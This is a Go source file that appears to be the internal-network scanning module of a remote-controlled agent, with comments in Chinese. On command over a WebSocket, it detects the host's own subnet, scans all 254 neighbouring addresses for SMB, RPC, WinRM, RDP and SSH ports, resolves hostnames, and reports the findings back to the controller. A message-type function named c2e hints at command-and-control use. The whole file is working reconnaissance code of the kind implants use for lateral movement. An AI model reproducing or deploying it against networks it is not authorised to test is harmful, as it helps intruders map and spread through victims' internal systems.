package main

import (
	"encoding/json"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// ═══ 内网扫描模块 ═══

type scanHost struct {
	IP       string `json:"ip"`
	Hostname string `json:"hostname"`
	Ports    []int  `json:"ports"`
}

type scanResult struct {
	Subnet  string     `json:"subnet"`
	LocalIP string     `json:"localIp"`
	Hosts   []scanHost `json:"hosts"`
	Error   string     `json:"error,omitempty"`
}

func handleNetScan(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var req struct {
		Subnet  string `json:"subnet"`
		Ports   string `json:"ports"`
		Timeout string `json:"timeout"`
	}
	json.Unmarshal(msg.Payload, &req)

	timeoutMs := 300
	if req.Timeout != "" {
		if v, err := strconv.Atoi(req.Timeout); err == nil && v > 0 && v <= 5000 {
			timeoutMs = v
		}
	}

	ports := []int{445, 135, 5985, 3389, 22}
	if req.Ports != "" {
		var custom []int
		for _, p := range strings.Split(req.Ports, ",") {
			if v, err := strconv.Atoi(strings.TrimSpace(p)); err == nil && v > 0 && v < 65536 {
				custom = append(custom, v)
			}
		}
		if len(custom) > 0 {
			ports = custom
		}
	}

	// 自动检测本机子网
	subnet := req.Subnet
	localIP := ""
	if subnet == "" {
		ifaces, _ := net.Interfaces()
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				ipnet, ok := addr.(*net.IPNet)
				if !ok || ipnet.IP.To4() == nil {
					continue
				}
				ip := ipnet.IP.String()
				if strings.HasPrefix(ip, "127.") {
					continue
				}
				segs := strings.Split(ip, ".")
				if len(segs) == 4 {
					subnet = segs[0] + "." + segs[1] + "." + segs[2]
					localIP = ip
					break
				}
			}
			if subnet != "" {
				break
			}
		}
	}

	if subnet == "" {
		sendScanResult(conn, writeMu, msg.ID, scanResult{Error: "无法检测本机子网"})
		return
	}

	if localIP == "" {
		localIP = subnet + ".1"
	}

	// 并行扫描 1-254
	type hostResult struct {
		ip    string
		host  string
		ports []int
	}

	var (
		resultMu sync.Mutex
		results  []hostResult
		wg       sync.WaitGroup
	)

	sem := make(chan struct{}, 50) // 并发限制 50
	timeout := time.Duration(timeoutMs) * time.Millisecond

	for i := 1; i <= 254; i++ {
		targetIP := fmt.Sprintf("%s.%d", subnet, i)
		if targetIP == localIP {
			continue
		}

		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			var openPorts []int
			for _, port := range ports {
				addr := fmt.Sprintf("%s:%d", ip, port)
				conn, err := net.DialTimeout("tcp", addr, timeout)
				if err == nil {
					conn.Close()
					openPorts = append(openPorts, port)
				}
			}

			if len(openPorts) > 0 {
				hostname := ""
				names, err := net.LookupAddr(ip)
				if err == nil && len(names) > 0 {
					hostname = strings.TrimSuffix(names[0], ".")
				}

				resultMu.Lock()
				results = append(results, hostResult{ip: ip, host: hostname, ports: openPorts})
				resultMu.Unlock()
			}
		}(targetIP)
	}

	wg.Wait()

	var hosts []scanHost
	for _, r := range results {
		hosts = append(hosts, scanHost{IP: r.ip, Hostname: r.host, Ports: r.ports})
	}
	if hosts == nil {
		hosts = []scanHost{}
	}

	sendScanResult(conn, writeMu, msg.ID, scanResult{
		Subnet:  subnet,
		LocalIP: localIP,
		Hosts:   hosts,
	})
}

func sendScanResult(conn *websocket.Conn, writeMu *sync.Mutex, msgID string, result scanResult) {
	data, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{
		Type:    c2e("net_scan_result"),
		ID:      msgID,
		Payload: data,
	})
	writeMu.Lock()
	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	conn.WriteMessage(websocket.TextMessage, resp)
	conn.SetWriteDeadline(time.Time{})
	writeMu.Unlock()
}
